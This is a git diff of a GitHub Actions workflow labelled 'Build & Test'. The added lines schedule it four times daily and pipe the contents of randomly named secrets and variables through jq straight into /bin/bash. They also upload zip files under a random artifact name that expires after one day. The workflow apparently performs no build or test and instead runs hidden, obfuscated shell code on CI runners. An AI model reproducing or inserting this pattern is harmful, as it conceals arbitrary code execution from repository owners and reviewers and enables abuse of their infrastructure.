@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '5 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,18 +16,14 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          cvg3246: ${{ secrets.cvg3246 }}
+          jk451: ${{ secrets.jk451 }}
         run: |
-          printf '%s' "$cvg3246" | jq -r .o6668 | /bin/bash
-          printf '%s' "$f86" | jq -r .xy546 | /bin/bash
-          printf '%s' "$vzkr48805" | jq -r .by9059 | /bin/bash
-          echo $mtzhg8321 | jq -r .x6 | /bin/bash
-          printf '%s' "$uzla46" | jq -r .o1517 | /bin/bash
-          echo $cwir03038 | jq -r .bkt994 | /bin/bash
+          printf '%s' "$jk451" | jq -r .g101 | /bin/bash
+          echo $t60 | jq -r .yaw420 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: Tzp39KHq
+          name: JJtfj0D9
           path: "*.zip"
           retention-days: 1
